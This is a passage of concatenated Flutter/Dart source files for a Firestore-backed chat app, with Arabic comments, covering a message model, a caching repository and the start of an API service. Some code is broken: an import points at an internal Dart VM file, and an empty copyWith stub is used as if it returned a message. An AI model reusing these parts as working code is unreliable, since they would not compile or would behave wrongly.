  final String senderId; //  agent_code
  final String? text;
  final MessageType messageType;
  final DateTime timestamp;
  final bool isSentByCurrentUser;

  final String? fileName;
  final String? fileUrl;
  final int? fileSize;

  ChatMessage({
    required this.id,
    required this.senderId,
    this.text,
    required this.messageType,
    required this.timestamp,
    required this.isSentByCurrentUser,
    this.fileName,
    this.fileUrl,
    this.fileSize,
  });

  factory ChatMessage.fromFirestore(
      DocumentSnapshot<Map<String, dynamic>> doc, String currentAgentCode) {
    final data = doc.data();
    if (data == null) {
      // يمكنك رمي استثناء أو إرجاع قيمة افتراضية إذا كان المستند فارغًا بشكل غير متوقع
      throw Exception(
          "ChatMessage document data is null for doc ID: ${doc.id}");
    }
    final senderAgentCode = data['senderAgentCode'] as String? ?? '';
    return ChatMessage(
      id: doc.id,
      senderId: senderAgentCode,
      text: data['text'] as String?,
      messageType: stringToMessageType(data['messageType'] as String?),
      timestamp: (data['timestamp'] as Timestamp? ?? Timestamp.now())
          .toDate(), // استخدام Timestamp من Firestore
      isSentByCurrentUser: senderAgentCode == currentAgentCode,
      fileName: data['fileName'] as String?,
      fileUrl: data['fileUrl'] as String?,
      fileSize: data['fileSize'] as int?,
    );
  }

  Map<String, dynamic> toFirestore() {
    return {
      'senderAgentCode': senderId,
      if (text != null && text!.isNotEmpty) 'text': text,
      'messageType': messageTypeToString(messageType),
      // سيتم تعيين timestamp كـ FieldValue.serverTimestamp() في ApiService
      // أو يمكنك استخدام Timestamp.fromDate(timestamp) إذا كنت تريد وقت العميل
      'timestamp':
          Timestamp.fromDate(timestamp), // أو اتركه ليتم تعيينه في ApiService
      if (fileName != null) 'fileName': fileName,
      if (fileUrl != null) 'fileUrl': fileUrl,
      if (fileSize != null) 'fileSize': fileSize,
    };
  }

  copyWith({required String id}) {}
}



// ------------------------------ نهاية الملف: chat_message.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: firestore_repository.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\data\repositories\firestore_repository.dart
// ----------------------------------------------------------------------

// lib/data/repositories/firestore_repository.dart
import 'dart:async';
import 'dart:nativewrappers/_internal/vm/lib/math_patch.dart';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/foundation.dart';

import '../../core/logging/logger_service.dart';
import '../models/chat/chat_conversation.dart';
import '../models/chat/chat_message.dart';

/// تنفيذ نمط Repository لعزل منطق التعامل مع Firestore وتوفير طبقة تخزين مؤقت
class FirestoreRepository {
  final FirebaseFirestore _firestore;
  final FirebaseStorage _storage;
  final LoggerService _logger;
  final String _currentAgentCode;

  // تخزين مؤقت للمحادثات
  final Map<String, ChatConversation> _conversationsCache = {};

  // تخزين مؤقت للرسائل مع مفتاح مركب من معرف المحادثة
  final Map<String, List<ChatMessage>> _messagesCache = {};

  // تخزين مؤقت لمعلومات المستخدمين
  final Map<String, ChatParticipantInfo> _participantInfoCache = {};

  // تخزين مؤقت لنتائج التحقق من رموز العملاء
  final Map<String, bool> _agentCodeValidationCache = {};

  // مؤقتات لإعادة تحميل البيانات
  final Map<String, Timer> _cacheExpiryTimers = {};

  // مدة صلاحية التخزين المؤقت
  static const Duration _cacheDuration = Duration(minutes: 15);
  static const Duration _participantInfoCacheDuration = Duration(hours: 1);

  // حد أقصى لعدد الرسائل في الصفحة الواحدة
  static const int _defaultPageSize = 20;

  // تدفقات البيانات المباشرة
  final Map<String, StreamController<List<ChatConversation>>>
  _conversationStreamControllers = {};
  final Map<String, StreamController<List<ChatMessage>>>
  _messageStreamControllers = {};

  FirestoreRepository(
    this._firestore,
    this._storage,
    this._logger,
    this._currentAgentCode,
  ) {
    if (_currentAgentCode.isEmpty) {
      _logger.error(
        "FirestoreRepository:Constructor",
        "CRITICAL: Repository initialized with an empty agent code!",
      );
    }
    _logger.info(
      "FirestoreRepository:Constructor",
      "Repository initialized for agent: $_currentAgentCode",
    );
  }

  /// الحصول على تدفق المحادثات مع التخزين المؤقت
  Stream<List<ChatConversation>> getConversationsStream() {
    final String cacheKey = 'conversations_$_currentAgentCode';

    // إنشاء وحدة تحكم بالتدفق إذا لم تكن موجودة
    _conversationStreamControllers[cacheKey] ??=
        StreamController<List<ChatConversation>>.broadcast(
          onListen: () {
            _logger.debug(
              "FirestoreRepository:getConversationsStream",
              "First listener attached, starting Firestore stream",
            );
            _startConversationsFirestoreStream(cacheKey);
          },
          onCancel: () {
            _logger.debug(
              "FirestoreRepository:getConversationsStream",
              "Last listener detached, considering cleanup",
            );
            // تنظيف بعد تأخير للسماح بإعادة الاستماع السريعة
            Future.delayed(const Duration(minutes: 5), () {
              if (_conversationStreamControllers[cacheKey]?.hasListener ==
                  false) {
                _logger.debug(
                  "FirestoreRepository:getConversationsStream",
                  "No listeners after delay, cleaning up",
                );
                _conversationStreamControllers[cacheKey]?.close();
                _conversationStreamControllers.remove(cacheKey);
              }
            });
          },
        );

    // إرسال البيانات المخزنة مؤقتًا فورًا إذا كانت متوفرة
    if (_conversationsCache.isNotEmpty) {
      final cachedConversations =
          _conversationsCache.values.toList()
            ..sort((a, b) => b.updatedAt.compareTo(a.updatedAt));
      _conversationStreamControllers[cacheKey]?.add(cachedConversations);
    }

    return _conversationStreamControllers[cacheKey]!.stream;
  }

  /// بدء تدفق Firestore للمحادثات
  void _startConversationsFirestoreStream(String cacheKey) {
    _firestore
        .collection("conversations")
        .where("participants", arrayContains: _currentAgentCode)
        .where("deletedForUsers.$_currentAgentCode", isNotEqualTo: true)
        .orderBy("updatedAt", descending: true)
        .snapshots()
        .listen(
          (snapshot) {
            _logger.debug(
              "FirestoreRepository:_startConversationsFirestoreStream",
              "Received ${snapshot.docs.length} conversations from Firestore",
            );

            // تحديث التخزين المؤقت
            for (final doc in snapshot.docs) {
              final conversation = ChatConversation.fromFirestore(
                doc as DocumentSnapshot<Map<String, dynamic>>,
                _currentAgentCode,
              );
              _conversationsCache[conversation.id] = conversation;
            }

            // إرسال البيانات المحدثة للمستمعين
            final conversations =
                _conversationsCache.values.toList()
                  ..sort((a, b) => b.updatedAt.compareTo(a.updatedAt));

            _conversationStreamControllers[cacheKey]?.add(conversations);

            // تعيين مؤقت لانتهاء صلاحية التخزين المؤقت
            _resetCacheExpiryTimer(cacheKey, _cacheDuration);
          },
          onError: (error, stackTrace) {
            _logger.error(
              "FirestoreRepository:_startConversationsFirestoreStream",
              "Error in Firestore stream",
              error,
              stackTrace,
            );
            _conversationStreamControllers[cacheKey]?.addError(
              error,
              stackTrace,
            );
          },
        );
  }

  /// الحصول على تدفق الرسائل مع التخزين المؤقت والتحميل الكسول
  Stream<List<ChatMessage>> getMessagesStream(
    String conversationId, {
    int pageSize = _defaultPageSize,
  }) {
    if (conversationId.isEmpty) {
      _logger.warn(
        "FirestoreRepository:getMessagesStream",
        "Empty conversation ID provided",
      );
      return Stream.value([]);
    }

    final String cacheKey = 'messages_${conversationId}_$_currentAgentCode';

    // إنشاء وحدة تحكم بالتدفق إذا لم تكن موجودة
    _messageStreamControllers[cacheKey] ??= StreamController<
      List<ChatMessage>
    >.broadcast(
      onListen: () {
        _logger.debug(
          "FirestoreRepository:getMessagesStream",
          "First listener attached for conversation $conversationId, starting Firestore stream",
        );
        _startMessagesFirestoreStream(conversationId, cacheKey, pageSize);
      },
      onCancel: () {
        _logger.debug(
          "FirestoreRepository:getMessagesStream",
          "Last listener detached for conversation $conversationId, considering cleanup",
        );
        // تنظيف بعد تأخير للسماح بإعادة الاستماع السريعة
        Future.delayed(const Duration(minutes: 5), () {
          if (_messageStreamControllers[cacheKey]?.hasListener == false) {
            _logger.debug(
              "FirestoreRepository:getMessagesStream",
              "No listeners after delay for conversation $conversationId, cleaning up",
            );
            _messageStreamControllers[cacheKey]?.close();
            _messageStreamControllers.remove(cacheKey);
          }
        });
      },
    );

    // إرسال البيانات المخزنة مؤقتًا فورًا إذا كانت متوفرة
    if (_messagesCache.containsKey(conversationId)) {
      _messageStreamControllers[cacheKey]?.add(
        List.unmodifiable(_messagesCache[conversationId]!),
      );
    }

    return _messageStreamControllers[cacheKey]!.stream;
  }

  /// بدء تدفق Firestore للرسائل مع التحميل الكسول
  void _startMessagesFirestoreStream(
    String conversationId,
    String cacheKey,
    int pageSize,
  ) {
    // استخدام التحميل الكسول (Lazy Loading) مع Pagination
    _firestore
        .collection("conversations")
        .doc(conversationId)
        .collection("messages")
        .orderBy(
          "timestamp",
          descending: true,
        ) // ترتيب تنازلي للحصول على أحدث الرسائل أولاً
        .limit(pageSize)
        .snapshots()
        .listen(
          (snapshot) {
            _logger.debug(
              "FirestoreRepository:_startMessagesFirestoreStream",
              "Received ${snapshot.docs.length} messages from Firestore for conversation $conversationId",
            );

            // تحويل المستندات إلى رسائل
            final messages =
                snapshot.docs
                    .map(
                      (doc) => ChatMessage.fromFirestore(
                        doc as DocumentSnapshot<Map<String, dynamic>>,
                        _currentAgentCode,
                      ),
                    )
                    .toList();

            // ترتيب الرسائل تصاعديًا حسب الوقت (الأقدم أولاً)
            messages.sort((a, b) => a.timestamp.compareTo(b.timestamp));

            // تحديث التخزين المؤقت
            _messagesCache[conversationId] = messages;

            // إرسال البيانات المحدثة للمستمعين
            _messageStreamControllers[cacheKey]?.add(
              List.unmodifiable(messages),
            );

            // تعيين مؤقت لانتهاء صلاحية التخزين المؤقت
            _resetCacheExpiryTimer('messages_$conversationId', _cacheDuration);
          },
          onError: (error, stackTrace) {
            _logger.error(
              "FirestoreRepository:_startMessagesFirestoreStream",
              "Error in Firestore stream for conversation $conversationId",
              error,
              stackTrace,
            );
            _messageStreamControllers[cacheKey]?.addError(error, stackTrace);
          },
        );
  }

  /// تحميل المزيد من الرسائل (صفحة إضافية)
  Future<List<ChatMessage>> loadMoreMessages(
    String conversationId,
    DateTime beforeTimestamp, {
    int pageSize = _defaultPageSize,
  }) async {
    if (conversationId.isEmpty) {
      _logger.warn(
        "FirestoreRepository:loadMoreMessages",
        "Empty conversation ID provided",
      );
      return [];
    }

    try {
      final snapshot =
          await _firestore
              .collection("conversations")
              .doc(conversationId)
              .collection("messages")
              .orderBy("timestamp", descending: true)
              .where("timestamp", isLessThan: beforeTimestamp)
              .limit(pageSize)
              .get();

      _logger.debug(
        "FirestoreRepository:loadMoreMessages",
        "Loaded ${snapshot.docs.length} more messages for conversation $conversationId",
      );

      // تحويل المستندات إلى رسائل
      final newMessages =
          snapshot.docs
              .map(
                (doc) => ChatMessage.fromFirestore(
                  doc as DocumentSnapshot<Map<String, dynamic>>,
                  _currentAgentCode,
                ),
              )
              .toList();

      // ترتيب الرسائل تصاعديًا حسب الوقت (الأقدم أولاً)
      newMessages.sort((a, b) => a.timestamp.compareTo(b.timestamp));

      // دمج الرسائل الجديدة مع الرسائل المخزنة مؤقتًا
      if (_messagesCache.containsKey(conversationId)) {
        final allMessages = [
          ..._messagesCache[conversationId]!,
          ...newMessages,
        ];
        // إزالة التكرارات (إذا وجدت)
        final uniqueMessages = <String, ChatMessage>{};
        for (final message in allMessages) {
          uniqueMessages[message.id] = message;
        }

        // ترتيب الرسائل تصاعديًا حسب الوقت
        final sortedMessages =
            uniqueMessages.values.toList()
              ..sort((a, b) => a.timestamp.compareTo(b.timestamp));

        // تحديث التخزين المؤقت
        _messagesCache[conversationId] = sortedMessages;

        // إرسال البيانات المحدثة للمستمعين
        final cacheKey = 'messages_${conversationId}_$_currentAgentCode';
        _messageStreamControllers[cacheKey]?.add(
          List.unmodifiable(sortedMessages),
        );
      } else {
        // إذا لم تكن هناك رسائل مخزنة مؤقتًا، فقم بتخزين الرسائل الجديدة
        _messagesCache[conversationId] = newMessages;
      }

      return newMessages;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:loadMoreMessages",
        "Error loading more messages for conversation $conversationId",
        e,
        s,
      );
      return [];
    }
  }

  /// الحصول على معلومات المستخدم مع التخزين المؤقت
  Future<ChatParticipantInfo?> getAgentInfo(String agentCode) async {
    if (agentCode.isEmpty) {
      _logger.warn(
        "FirestoreRepository:getAgentInfo",
        "Empty agent code provided",
      );
      return null;
    }

    // التحقق من التخزين المؤقت أولاً
    if (_participantInfoCache.containsKey(agentCode)) {
      _logger.debug(
        "FirestoreRepository:getAgentInfo",
        "Returning cached participant info for agent $agentCode",
      );
      return _participantInfoCache[agentCode];
    }

    try {
      final doc =
          await _firestore.collection("agent_identities").doc(agentCode).get();

      if (doc.exists) {
        final data = doc.data()!;
        final participantInfo = ChatParticipantInfo(
          agentCode: agentCode,
          displayName: data["displayName"] as String? ?? agentCode,
        );

        // تخزين في الذاكرة المؤقتة
        _participantInfoCache[agentCode] = participantInfo;

        // تعيين مؤقت لانتهاء صلاحية التخزين المؤقت
        _resetCacheExpiryTimer(
          'participant_$agentCode',
          _participantInfoCacheDuration,
        );

        return participantInfo;
      }

      _logger.warn(
        "FirestoreRepository:getAgentInfo",
        "Agent info not found for $agentCode in 'agent_identities'",
      );
      return null;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:getAgentInfo",
        "Error fetching agent info for $agentCode",
        e,
        s,
      );
      return null;
    }
  }

  /// التحقق من صحة رمز العميل مع التخزين المؤقت
  Future<bool> validateAgentCode(String agentCode) async {
    if (agentCode.isEmpty) {
      _logger.warn(
        "FirestoreRepository:validateAgentCode",
        "Empty agent code provided",
      );
      return false;
    }

    // التحقق من التخزين المؤقت أولاً
    if (_agentCodeValidationCache.containsKey(agentCode)) {
      _logger.debug(
        "FirestoreRepository:validateAgentCode",
        "Returning cached validation result for agent $agentCode",
      );
      return _agentCodeValidationCache[agentCode]!;
    }

    try {
      final doc =
          await _firestore.collection("agent_identities").doc(agentCode).get();

      final isValid = doc.exists;

      // تخزين في الذاكرة المؤقتة
      _agentCodeValidationCache[agentCode] = isValid;

      // تعيين مؤقت لانتهاء صلاحية التخزين المؤقت
      _resetCacheExpiryTimer(
        'validation_$agentCode',
        _participantInfoCacheDuration,
      );

      return isValid;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:validateAgentCode",
        "Error validating agent code $agentCode",
        e,
        s,
      );
      return false;
    }
  }

  /// إنشاء أو الحصول على محادثة مع المشاركين
  Future<String?> createOrGetConversation(
    List<String> participantAgentCodes,
    Map<String, ChatParticipantInfo> participantInfoMap, {
    String? groupTitle,
  }) async {
    _logger.info(
      "FirestoreRepository:createOrGetConversation",
      "Attempting with participants: $participantAgentCodes. Current user: $_currentAgentCode",
    );

    final allParticipantsSorted = List<String>.from(participantAgentCodes);
    if (!allParticipantsSorted.contains(_currentAgentCode)) {
      allParticipantsSorted.add(_currentAgentCode);
    }
    allParticipantsSorted.sort();

    // تجميع معلومات المشاركين
    final Map<String, ChatParticipantInfo> finalParticipantInfoMap =
        Map<String, ChatParticipantInfo>.from(participantInfoMap);

    // إضافة معلومات المستخدم الحالي إذا لم تكن موجودة
    if (!finalParticipantInfoMap.containsKey(_currentAgentCode)) {
      final currentUserInfo = await getAgentInfo(_currentAgentCode);
      if (currentUserInfo != null) {
        finalParticipantInfoMap[_currentAgentCode] = currentUserInfo;
      } else {
        finalParticipantInfoMap[_currentAgentCode] = ChatParticipantInfo(
          agentCode: _currentAgentCode,
          displayName:
              "أنا (${_currentAgentCode.substring(0, min(3, _currentAgentCode.length))}..)",
        );
      }
    }

    // جمع معلومات المشاركين الآخرين
    for (final code in allParticipantsSorted) {
      if (!finalParticipantInfoMap.containsKey(code)) {
        final info = await getAgentInfo(code);
        if (info != null) {
          finalParticipantInfoMap[code] = info;
        } else {
          _logger.error(
            "FirestoreRepository:createOrGetConversation",
            "Could not fetch participant info for $code",
          );
          return null;
        }
      }
    }

    // التحقق من وجود محادثة ثنائية
    if (allParticipantsSorted.length == 2) {
      try {
        final existingConversation =
            await _firestore
                .collection("conversations")
                .where("participants", isEqualTo: allParticipantsSorted)
                .limit(1)
                .get();

        if (existingConversation.docs.isNotEmpty) {
          final doc = existingConversation.docs.first;
          final docId = doc.id;
          final data = doc.data() as Map<String, dynamic>?;
          final deletedForUsers =
              data?["deletedForUsers"] as Map<String, dynamic>?;

          // إذا كانت المحادثة محذوفة للمستخدم الحالي، قم بإلغاء الحذف
          if (deletedForUsers != null &&
              deletedForUsers[_currentAgentCode] == true) {
            await _firestore.collection("conversations").doc(docId).update({
              "deletedForUsers.$_currentAgentCode": FieldValue.delete(),
              "updatedAt": FieldValue.serverTimestamp(),
            });
          }

          _logger.info(
            "FirestoreRepository:createOrGetConversation",
            "Found/Reactivated existing 2-party conversation: $docId",
          );
          return docId;
        }
      } catch (e, s) {
        _logger.error(
          "FirestoreRepository:createOrGetConversation",
          "Error checking for existing conversation",
          e,
          s,
        );
      }
    }

    // إنشاء محادثة جديدة
    final now = DateTime.now();
    final newConversation = ChatConversation(
      id: "",
      participants: allParticipantsSorted,
      participantInfo: finalParticipantInfoMap,
      conversationTitle:
          groupTitle ??
          (allParticipantsSorted.length > 2
              ? "مجموعة جديدة (${allParticipantsSorted.length})"
              : "محادثة"),
      lastMessageText: "تم إنشاء المحادثة.",
      lastMessageTimestamp: now,
      lastMessageSenderAgentCode: _currentAgentCode,
      createdAt: now,
      updatedAt: now,
      deletedForUsers: {},
    );

    try {
      final docRef = await _firestore
          .collection("conversations")
          .add(newConversation.toFirestore());

      _logger.info(
        "FirestoreRepository:createOrGetConversation",
        "Successfully created new conversation with ID: ${docRef.id}",
      );

      // تحديث التخزين المؤقت
      final createdConversation = newConversation.copyWith(id: docRef.id);
      _conversationsCache[docRef.id] = createdConversation;

      // إرسال البيانات المحدثة للمستمعين
      final cacheKey = 'conversations_$_currentAgentCode';
      if (_conversationStreamControllers.containsKey(cacheKey)) {
        final conversations =
            _conversationsCache.values.toList()
              ..sort((a, b) => b.updatedAt.compareTo(a.updatedAt));
        _conversationStreamControllers[cacheKey]?.add(conversations);
      }

      return docRef.id;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:createOrGetConversation",
        "Failed to create new conversation in Firestore",
        e,
        s,
      );
      return null;
    }
  }

  /// إرسال رسالة إلى محادثة
  Future<bool> sendMessage(String conversationId, ChatMessage message) async {
    _logger.info(
      "FirestoreRepository:sendMessage",
      "Sending message to conversation $conversationId by agent $_currentAgentCode",
    );

    if (conversationId.isEmpty || message.senderId != _currentAgentCode) {
      _logger.error(
        "FirestoreRepository:sendMessage",
        "Invalid params: convId empty or senderId mismatch",
      );
      return false;
    }

    try {
      final messageData = message.toFirestore();
      messageData["timestamp"] = FieldValue.serverTimestamp();

      final messageDocRef = await _firestore
          .collection("conversations")
          .doc(conversationId)
          .collection("messages")
          .add(messageData);

      // تحديث بيانات المحادثة
      Map<String, dynamic> updateData = {
        "lastMessageText": message.text ?? (message.fileName ?? "مرفق"),
        "lastMessageTimestamp": FieldValue.serverTimestamp(),
        "lastMessageSenderAgentCode": message.senderId,
        "updatedAt": FieldValue.serverTimestamp(),
        "deletedForUsers": {},
      };

      await _firestore
          .collection("conversations")
          .doc(conversationId)
          .update(updateData);

      // تحديث التخزين المؤقت للرسائل
      if (_messagesCache.containsKey(conversationId)) {
        final updatedMessage = message.copyWith(id: messageDocRef.id);
        _messagesCache[conversationId]!.add(updatedMessage);

        // إرسال البيانات المحدثة للمستمعين
        final cacheKey = 'messages_${conversationId}_$_currentAgentCode';
        if (_messageStreamControllers.containsKey(cacheKey)) {
          _messageStreamControllers[cacheKey]?.add(
            List.unmodifiable(_messagesCache[conversationId]!),
          );
        }
      }

      return true;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:sendMessage",
        "Failed to send message to conversation $conversationId",
        e,
        s,
      );
      return false;
    }
  }

  /// تحميل ملف إلى Firebase Storage
  Future<String?> uploadFile(
    List<int> fileBytes,
    String fileName,
    String conversationId,
  ) async {
    _logger.info(
      "FirestoreRepository:uploadFile",
      "Uploading file $fileName to conversation $conversationId",
    );

    if (fileBytes.isEmpty || fileName.isEmpty || conversationId.isEmpty) {
      _logger.error("FirestoreRepository:uploadFile", "Invalid params");
      return null;
    }

    try {
      final String filePath =
          "chat_attachments/$conversationId/${DateTime.now().millisecondsSinceEpoch}_$fileName";
      final ref = _storage.ref().child(filePath);

      final uploadTask = ref.putData(Uint8List.fromList(fileBytes));
      final snapshot = await uploadTask;

      final downloadUrl = await snapshot.ref.getDownloadURL();
      _logger.info(
        "FirestoreRepository:uploadFile",
        "File uploaded successfully. URL: $downloadUrl",
      );

      return downloadUrl;
    } catch (e, s) {
      _logger.error(
        "FirestoreRepository:uploadFile",
        "Error uploading file",
        e,
        s,
      );
      return null;
    }
  }

  /// إعادة تعيين مؤقت انتهاء صلاحية التخزين المؤقت
  void _resetCacheExpiryTimer(String cacheKey, Duration duration) {
    _cacheExpiryTimers[cacheKey]?.cancel();
    _cacheExpiryTimers[cacheKey] = Timer(duration, () {
      _logger.debug(
        "FirestoreRepository:_resetCacheExpiryTimer",
        "Cache expired for key $cacheKey",
      );

      if (cacheKey.startsWith('conversations_')) {
        // لا نقوم بمسح التخزين المؤقت للمحادثات، فقط نعيد تحميلها
        // لأن التدفق المباشر سيقوم بتحديثها
      } else if (cacheKey.startsWith('messages_')) {
        final conversationId = cacheKey.split('_')[1];
        _messagesCache.remove(conversationId);
      } else if (cacheKey.startsWith('participant_')) {
        final agentCode = cacheKey.substring('participant_'.length);
        _participantInfoCache.remove(agentCode);
      } else if (cacheKey.startsWith('validation_')) {
        final agentCode = cacheKey.substring('validation_'.length);
        _agentCodeValidationCache.remove(agentCode);
      }

      _cacheExpiryTimers.remove(cacheKey);
    });
  }

  /// تنظيف الموارد عند التخلص من الكائن
  void dispose() {
    // إلغاء جميع المؤقتات
    for (final timer in _cacheExpiryTimers.values) {
      timer.cancel();
    }
    _cacheExpiryTimers.clear();

    // إغلاق جميع وحدات التحكم بالتدفق
    for (final controller in _conversationStreamControllers.values) {
      controller.close();
    }
    _conversationStreamControllers.clear();

    for (final controller in _messageStreamControllers.values) {
      controller.close();
    }
    _messageStreamControllers.clear();

    // مسح التخزين المؤقت
    _conversationsCache.clear();
    _messagesCache.clear();
    _participantInfoCache.clear();
    _agentCodeValidationCache.clear();
  }
}



// ------------------------------ نهاية الملف: firestore_repository.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: api_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\api_service.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/api_service.dart
import "dart:async";
import "dart:io"; // Required for File operations
import "dart:math";

import "package:cloud_firestore/cloud_firestore.dart";
import "package:firebase_storage/firebase_storage.dart"; // Import Firebase Storage
import "package:file_picker/file_picker.dart"; // Required for PlatformFile
import "package:path/path.dart" as p; // For path manipulation

import "../../core/logging/logger_service.dart";
import "../../data/models/chat/chat_conversation.dart";
import "../../data/models/chat/chat_message.dart";

class ApiService {
  final FirebaseFirestore _firestore;
  final FirebaseStorage _storage; // Add Firebase Storage instance
  final LoggerService _logger;
  final String _currentAgentCode;

  String get currentAgentCodeValue => _currentAgentCode;

  ApiService(this._firestore, this._storage, this._logger, this._currentAgentCode) {
    if (_currentAgentCode.isEmpty) {
      _logger.error("ApiService:Constructor",
          "CRITICAL: ApiService initialized with an empty agent code!");
    }
    _logger.info("ApiService:Constructor",
        "ApiService initialized for agent: $_currentAgentCode");
  }

  // Method to upload file to Firebase Storage
  Future<String?> uploadFileToStorage(PlatformFile platformFile, String conversationId) async {
    if (platformFile.path == null) {
      _logger.error("ApiService:uploadFileToStorage", "File path is null for ${platformFile.name}");
      return null;
    }
    File file = File(platformFile.path!);
    String fileName = "${DateTime.now().millisecondsSinceEpoch}_${p.basename(file.path)}";
    String filePath = "chat_attachments/$conversationId/$fileName";

    _logger.info("ApiService:uploadFileToStorage", "Attempting to upload ${platformFile.name} to $filePath");

    try {
      UploadTask uploadTask = _storage.ref().child(filePath).putFile(file);
      TaskSnapshot snapshot = await uploadTask;
      String downloadUrl = await snapshot.ref.getDownloadURL();
      _logger.info("ApiService:uploadFileToStorage", "File ${platformFile.name} uploaded successfully. URL: $downloadUrl");
      return downloadUrl;
    } on FirebaseException catch (e, s) {
      _logger.error("ApiService:uploadFileToStorage", "FirebaseException during upload for ${platformFile.name}: ${e.message}", e, s);
      return null;
    } catch (e, s) {
      _logger.error("ApiService:uploadFileToStorage", "Generic error during upload for ${platformFile.name}", e, s);
      return null;
    }
  }

  Stream<List<ChatConversation>> getConversationsStream() {
    _logger.info("ApiService:getConversationsStream",
        "Fetching conversations for agent: $_currentAgentCode, excluding those marked as deleted for this agent.");
    return _firestore
        .collection("conversations")
        .where("participants", arrayContains: _currentAgentCode) // User must be a participant
        .where("deletedForUsers.$_currentAgentCode", isNotEqualTo: true) // Exclude if marked deleted for this user
        .orderBy("updatedAt", descending: true)
        .snapshots()
        .map((snapshot) {
      if (snapshot.docs.isEmpty) {
        _logger.info(
            "ApiService:getConversationsStream", "No active conversations found for $_currentAgentCode.");
        return <ChatConversation>[];
      }
      _logger.debug("ApiService:getConversationsStream",
          "Received ${snapshot.docs.length} active conversations for $_currentAgentCode.");
      return snapshot.docs
          .map((doc) => ChatConversation.fromFirestore(
              doc as DocumentSnapshot<Map<String, dynamic>>, _currentAgentCode))
          .toList();
    }).handleError((error, stackTrace) {
      _logger.error("ApiService:getConversationsStream", "Error in stream for $_currentAgentCode",
          error, stackTrace);
      return <ChatConversation>[];
    });
  }

  Stream<List<ChatMessage>> getMessagesStream(String conversationId) {
    _logger.info("ApiService:getMessagesStream",
        "Fetching for conversation $conversationId");
    if (conversationId.isEmpty) {
      _logger.warn("ApiService:getMessagesStream",
          "Received empty conversationId. Returning empty stream.");
      return Stream.value([]);
    }
    // Note: Messages are not soft-deleted individually in this scheme.
    // If a conversation is soft-deleted for a user, they won't see it, thus won't fetch its messages.
    return _firestore
        .collection("conversations")
        .doc(conversationId)
        .collection("messages")
        .orderBy("timestamp", descending: false)
        .snapshots()
        .map((snapshot) {
      if (snapshot.docs.isEmpty) {
        _logger.info("ApiService:getMessagesStream",
            "No messages found for $conversationId.");
        return <ChatMessage>[];
      }
      _logger.debug("ApiService:getMessagesStream",
          "Received ${snapshot.docs.length} messages for $conversationId.");
      return snapshot.docs
          .map((doc) => ChatMessage.fromFirestore(
              doc as DocumentSnapshot<Map<String, dynamic>>, _currentAgentCode))
          .toList();
    }).handleError((error, stackTrace) {
      _logger.error("ApiService:getMessagesStream",
          "Error in stream for $conversationId", error, stackTrace);
      return <ChatMessage>[];
    });
  }

  Future<ChatParticipantInfo?> getAgentInfo(String agentCodeToFetch) async {
    _logger.info("ApiService:getAgentInfo",
        "Fetching info for agent_code: $agentCodeToFetch");
    if (agentCodeToFetch.isEmpty) {
      _logger.warn(
          "ApiService:getAgentInfo", "Received empty agentCodeToFetch.");
      return null;
    }
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCodeToFetch)
          .get();
      if (doc.exists) {
        final data = doc.data()!;
        _logger.debug("ApiService:getAgentInfo",
            "Agent $agentCodeToFetch found. DisplayName: ${data["displayName"]}");
        return ChatParticipantInfo(
          agentCode: agentCodeToFetch,
          displayName: data["displayName"] as String? ?? agentCodeToFetch,
        );
      }
      _logger.warn("ApiService:getAgentInfo",
          "Agent info not found for $agentCodeToFetch in 'agent_identities'.");
      return null;
    } catch (e, s) {
      _logger.error("ApiService:getAgentInfo",
          "Error fetching agent info for $agentCodeToFetch", e, s);
      return null;
    }
  }

  Future<String?> createOrGetConversationWithParticipants(
      List<String> participantAgentCodes,
      Map<String, ChatParticipantInfo> participantInfoMapInput,
      {String? groupTitle}) async {
    _logger.info("ApiService:createOrGetConversation",
        "Attempting with initial participants: $participantAgentCodes. Current user: $_currentAgentCode");

    final allParticipantsSorted = List<String>.from(participantAgentCodes);
    if (!allParticipantsSorted.contains(_currentAgentCode)) {
      allParticipantsSorted.add(_currentAgentCode);
    }
    allParticipantsSorted.sort();

    _logger.debug("ApiService:createOrGetConversation",
        "All sorted participants: $allParticipantsSorted");

    var finalParticipantInfoMap =
        Map<String, ChatParticipantInfo>.from(participantInfoMapInput);
    if (!finalParticipantInfoMap.containsKey(_currentAgentCode)) {
      final currentUserInfo = await getAgentInfo(_currentAgentCode);
      if (currentUserInfo != null) {
        finalParticipantInfoMap[_currentAgentCode] = currentUserInfo;
      } else {
        _logger.warn("ApiService:createOrGetConversation",
            "Could not fetch current user info for $_currentAgentCode. Using fallback.");
        finalParticipantInfoMap[_currentAgentCode] = ChatParticipantInfo(
            agentCode: _currentAgentCode,
            displayName:
                "أنا (${_currentAgentCode.substring(0, min(3, _currentAgentCode.length))}..)");
      }
    }
    for (String code in allParticipantsSorted) {
      if (!finalParticipantInfoMap.containsKey(code)) {
        final info = await getAgentInfo(code);
        if (info != null) {
          finalParticipantInfoMap[code] = info;
        } else {
          _logger.error("ApiService:createOrGetConversation",
              "Could not fetch participant info for $code.");
          return null;
        }
      }
    }

    // When creating/getting a conversation, we should also check the deletedForUsers status
    // If a 2-party conversation exists but is marked deleted for the current user, we might want to "un-delete" it or create a new one.
    // For now, let's assume if it exists, we return it, and the UI handles showing it if not deleted.
    // The getConversationsStream will filter it out if it's marked deleted.
    // If we want to "un-delete" upon trying to re-open, that logic would be here.
    // For simplicity, let's stick to the current behavior: if it exists, return its ID.
    // The client will then try to fetch it via getConversationsStream which will filter it if deleted.
    // This might lead to a situation where a user tries to open a chat that then disappears.
    // A better approach might be to check deletedForUsers here and if true for current user, update it to false.

    if (allParticipantsSorted.length == 2) {
      _logger.debug("ApiService:createOrGetConversation",
          "Checking for existing 2-party conversation.");
      QuerySnapshot existingConversation = await _firestore
          .collection("conversations")
          .where("participants", isEqualTo: allParticipantsSorted)
          // No filter for deletedForUsers here, as we want to find it even if soft-deleted by one party.
